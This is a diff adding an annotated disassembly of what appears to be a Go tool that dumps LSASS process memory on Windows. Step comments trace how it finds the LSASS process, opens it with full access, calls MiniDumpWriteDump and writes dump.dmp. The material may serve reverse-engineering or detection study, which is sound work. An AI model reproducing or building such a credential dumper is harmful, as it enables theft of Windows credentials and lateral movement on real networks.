@@ -1,0 +1,73 @@
+48 81 EC 88 02 00 00                            sub     rsp, 288h       ; Integer Subtraction
+48 89 AC 24 80 02 00 00                         mov     [rsp+288h+var_8], rbp
+48 8D AC 24 80 02 00 00                         lea     rbp, [rsp+288h+var_8] ; Load Effective Address
+48 89 9C 24 98 02 00 00                         mov     [rsp+288h+arg_8], rbx
+48 89 84 24 90 02 00 00                         mov     [rsp+288h+arg_0], rax
+B8 02 00 00 00                                  mov     eax, 2
+31 DB                                           xor     ebx, ebx        ; Logical Exclusive OR
+E8 BB 29 FF FF                                  call    golang_org_x_sys_windows_CreateToolhelp32Snapshot ; Call Procedure
+//Get Process ID
+
+
+
+
+
+
+4C 8D 05 21 D6 04 00                            lea     r8, off_500940  ; "[*] Get process id"
+4C 89 44 24 68                                  mov     qword ptr [rsp+0F8h+var_98+8], r8
+48 8B 1D BD 6E 0D 00                            mov     rbx, cs:os_Stdout
+48 8D 05 96 DB 04 00                            lea     rax, go_itab__os_File_io_Writer ; Load Effective Address
+48 8D 4C 24 60                                  lea     rcx, [rsp+0F8h+var_98] ; Load Effective Address
+BF 01 00 00 00                                  mov     edi, 1
+48 89 FE                                        mov     rsi, rdi
+90                                              nop                     ; No Operation
+E8 FB 6B FE FF                                  call    fmt_Fprintln    ; Call Procedure
+48 8D 05 85 E8 01 00                            lea     rax, aLsassExe  ; "lsass.exe"
+BB 09 00 00 00                                  mov     ebx, 9
+E8 EA 02 00 00                   
+//Using GETProcessID to open LSASS.exe 
+
+
+
+
+//Open LSASS Handle
+
+44 0F 11 7C 24 50                               movups  [rsp+0F8h+var_A8], xmm15 ; Move Unaligned Four Packed Single-FP
+48 8D 15 3A 99 00 00                            lea     rdx, RTYPE_string ; Load Effective Address
+48 89 54 24 50                                  mov     qword ptr [rsp+0F8h+var_A8], rdx
+4C 8D 05 EE D4 04 00                            lea     r8, off_500960  ; "[*] Open lsass handle"
+4C 89 44 24 58                                  mov     qword ptr [rsp+0F8h+var_A8+8], r8
+48 8B 1D 6A 6D 0D 00                            mov     rbx, cs:os_Stdout
+48 8D 05 43 DA 04 00                            lea     rax, go_itab__os_File_io_Writer ; Load Effective Address
+48 8D 4C 24 50                                  lea     rcx, [rsp+0F8h+var_A8] ; Load Effective Address
+BF 01 00 00 00                                  mov     edi, 1
+48 89 FE                                        mov     rsi, rdi
+E8 A9 6A FE FF                                  call    fmt_Fprintln    ; Call Procedure
+B8 FF 0F 1F 00                                  mov     eax, 1F0FFFh
+31 DB                                           xor     ebx, ebx        ; Logical Exclusive OR
+8B 4C 24 2C                                     mov     ecx, [rsp+0F8h+var_CC]
+E8 79 30 FF FF                                  call    golang_org_x_sys_windows_OpenProcess ; Call Procedure
+
+
+
+
+//Dump LSASS with pid 0
+
+48 8B 54 24 30                                  mov     rdx, [rsp+0F8h+var_C8]
+48 89 10                                        mov     [rax], rdx
+48 C7 40 08 00 00 00 00                         mov     qword ptr [rax+8], 0
+48 8B 54 24 38                                  mov     rdx, [rsp+0F8h+var_C0]
+48 89 50 10                                     mov     [rax+10h], rdx
+48 C7 40 18 02 00 00 00                         mov     qword ptr [rax+18h], 2
+44 0F 11 78 20                                  movups  xmmword ptr [rax+20h], xmm15 ; Move Unaligned Four Packed Single-FP
+48 C7 40 30 00 00 00 00                         mov     qword ptr [rax+30h], 0
+48 8B 15 0D 6C 0D 00                            mov     rdx, cs:main_miniDumpWriteDumpWin32
+
+
+//Create Dump File 
+48 8D 05 69 E4 01 00                            lea     rax, aDumpDmp   ; "dump.dmp"
+BB 08 00 00 00                                  mov     ebx, 8
+B9 42 00 00 00                                  mov     ecx, 42h ; 'B'
+BF FF 01 00 00                                  mov     edi, 1FFh
+90                                              nop                     ; No Operation
+E8 7B 28 FF FF                                  call    golang_org_x_sys_windows_Open ; Call Procedur
